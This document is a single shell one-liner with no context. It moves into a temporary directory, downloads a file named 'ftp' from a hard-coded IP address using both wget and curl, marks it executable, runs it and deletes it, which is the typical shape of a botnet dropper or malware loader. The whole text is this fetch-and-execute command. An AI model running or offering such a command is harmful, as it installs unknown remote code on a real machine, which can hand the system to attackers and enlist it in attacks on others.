cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.137.21/ftp; curl -O http://51.15.137.21/ftp; chmod +x ftp; ./ftp; rm -rf ftp
